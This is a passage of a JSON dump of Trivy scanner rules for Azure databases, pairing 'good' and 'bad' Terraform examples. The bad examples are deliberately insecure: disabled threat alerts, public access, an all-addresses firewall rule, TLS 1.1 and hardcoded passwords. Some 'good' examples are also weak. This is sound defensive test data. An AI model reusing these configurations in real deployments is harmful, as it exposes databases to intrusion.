        "local_path": "azure/database/all_threat_alerts_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts            = []\n  retention_days             = 20\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  retention_days = 20\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ENABLE_AUDIT",
        "title": "Enable Audit",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_extended_auditing_policy\n  good:\n    - |-\n      resource \"azurerm_sql_server\" \"good_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"mradministrator\"\n        administrator_login_password = \"tfsecRocks\"\n      }\n\n      resource \"azurerm_mssql_server_extended_auditing_policy\" \"example\" {\n        server_id                               = azurerm_sql_server.good_example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = true\n        retention_in_days                       = 6\n      }\n  bad:\n    - |-\n      resource \"azurerm_sql_server\" \"bad_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"mradministrator\"\n        administrator_login_password = \"tfsecRocks\"\n      }\n",
        "file_name": "enable_audit.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/enable_audit.yaml",
        "local_path": "azure/database/enable_audit.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_extended_auditing_policy"
            ],
            "good": [
              "resource \"azurerm_sql_server\" \"good_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"mradministrator\"\n  administrator_login_password = \"tfsecRocks\"\n}\n\nresource \"azurerm_mssql_server_extended_auditing_policy\" \"example\" {\n  server_id                               = azurerm_sql_server.good_example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = true\n  retention_in_days                       = 6\n}"
            ],
            "bad": [
              "resource \"azurerm_sql_server\" \"bad_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"mradministrator\"\n  administrator_login_password = \"tfsecRocks\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ENABLE_SSL_ENFORCEMENT",
        "title": "Enable Ssl Enforcement",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled\n  good:\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"good_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = true\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n",
        "file_name": "enable_ssl_enforcement.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/enable_ssl_enforcement.yaml",
        "local_path": "azure/database/enable_ssl_enforcement.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled"
            ],
            "good": [
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"good_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = true\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled\n  good:\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/no_public_access.yaml",
        "local_path": "azure/database/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled"
            ],
            "good": [
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-NO_PUBLIC_FIREWALL_ACCESS",
        "title": "No Public Firewall Access",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address\n  good:\n    - |-\n      resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n        name                = \"good_rule\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_sql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"0.0.0.0\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"api-rg-pro\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                    = \"example-postgre-server\"\n        location                = azurerm_resource_group.example.location\n        resource_group_name     = azurerm_resource_group.example.name\n        sku_name                = \"GP_Gen5_2\"\n        version                 = \"11\"\n        ssl_enforcement_enabled = true\n      }\n\n      resource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n        name                = \"bad_example\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"255.255.255.255\"\n      }\n    - |-\n      resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n        name                = \"bad_rule\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_sql_server.example.name\n        start_ip_address    = \"0.0.0.0\"\n        end_ip_address      = \"255.255.255.255\"\n      }\n\n\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_sql_server\" \"example\" {\n        name                         = \"mysqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"4dm1n157r470r\"\n        administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n      }\n",
        "file_name": "no_public_firewall_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/no_public_firewall_access.yaml",
        "local_path": "azure/database/no_public_firewall_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address"
            ],
            "good": [
              "resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n  name                = \"good_rule\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_sql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"0.0.0.0\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"api-rg-pro\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                    = \"example-postgre-server\"\n  location                = azurerm_resource_group.example.location\n  resource_group_name     = azurerm_resource_group.example.name\n  sku_name                = \"GP_Gen5_2\"\n  version                 = \"11\"\n  ssl_enforcement_enabled = true\n}\n\nresource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n  name                = \"bad_example\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}",
              "resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n  name                = \"bad_rule\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_sql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}\n\n\nresource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"example\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_CONNECTION_THROTTLING",
        "title": "Postgres Configuration Connection Throttling",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"connection_throttling\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_connection_throttling.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_connection_throttling.yaml",
        "local_path": "azure/database/postgres_configuration_connection_throttling.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"connection_throttling\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_LOG_CHECKPOINTS",
        "title": "Postgres Configuration Log Checkpoints",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"log_checkpoints\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_log_checkpoints.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_log_checkpoints.yaml",
        "local_path": "azure/database/postgres_configuration_log_checkpoints.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"log_checkpoints\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-POSTGRES_CONFIGURATION_LOG_CONNECTIONS",
        "title": "Postgres Configuration Log Connections",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration\n    - https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging\n  good:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n\n      resource \"azurerm_postgresql_configuration\" \"example\" {\n        name                = \"log_connections\"\n        resource_group_name = azurerm_resource_group.example.name\n        server_name         = azurerm_postgresql_server.example.name\n        value               = \"on\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_resource_group\" \"example\" {\n        name     = \"example-resources\"\n        location = \"West Europe\"\n      }\n\n      resource \"azurerm_postgresql_server\" \"example\" {\n        name                = \"example-psqlserver\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        administrator_login          = \"psqladminun\"\n        administrator_login_password = \"H@Sh1CoR3!\"\n\n        sku_name   = \"GP_Gen5_4\"\n        version    = \"9.6\"\n        storage_mb = 640000\n      }\n",
        "file_name": "postgres_configuration_log_connections.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/postgres_configuration_log_connections.yaml",
        "local_path": "azure/database/postgres_configuration_log_connections.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration",
              "https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging"
            ],
            "good": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}\n\nresource \"azurerm_postgresql_configuration\" \"example\" {\n  name                = \"log_connections\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}"
            ],
            "bad": [
              "resource \"azurerm_resource_group\" \"example\" {\n  name     = \"example-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_postgresql_server\" \"example\" {\n  name                = \"example-psqlserver\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  administrator_login          = \"psqladminun\"\n  administrator_login_password = \"H@Sh1CoR3!\"\n\n  sku_name   = \"GP_Gen5_4\"\n  version    = \"9.6\"\n  storage_mb = 640000\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-RETENTION_PERIOD_SET",
        "title": "Retention Period Set",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days\n  good:\n    - |-\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n      }\n\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n        retention_in_days                       = 90\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n        database_id                             = azurerm_mssql_database.example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = false\n        retention_in_days                       = 6\n      }\n",
        "file_name": "retention_period_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/retention_period_set.yaml",
        "local_path": "azure/database/retention_period_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days"
            ],
            "good": [
              "resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n}\n\nresource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n  retention_in_days                       = 90\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n  database_id                             = azurerm_mssql_database.example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = false\n  retention_in_days                       = 6\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-SECURE_TLS_POLICY",
        "title": "Secure Tls Policy",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced\n  good:\n    - |-\n      resource \"azurerm_mssql_server\" \"good_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"missadministrator\"\n        administrator_login_password = \"thisIsKat11\"\n        minimum_tls_version          = \"1.2\"\n      }\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server\" \"bad_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"missadministrator\"\n        administrator_login_password = \"thisIsKat11\"\n        minimum_tls_version          = \"1.1\"\n      }\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = true\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_1\"\n      }\n",
        "file_name": "secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/secure_tls_policy.yaml",
        "local_path": "azure/database/secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced"
            ],
            "good": [
              "resource \"azurerm_mssql_server\" \"good_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"missadministrator\"\n  administrator_login_password = \"thisIsKat11\"\n  minimum_tls_version          = \"1.2\"\n}",
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server\" \"bad_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"missadministrator\"\n  administrator_login_password = \"thisIsKat11\"\n  minimum_tls_version          = \"1.1\"\n}",
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = true\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-THREAT_ALERT_EMAIL_SET",
        "title": "Threat Alert Email Set",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        email_addresses = [\"db-security@acme.org\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        email_addresses = []\n      }\n",
        "file_name": "threat_alert_email_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/threat_alert_email_set.yaml",
        "local_path": "azure/database/threat_alert_email_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
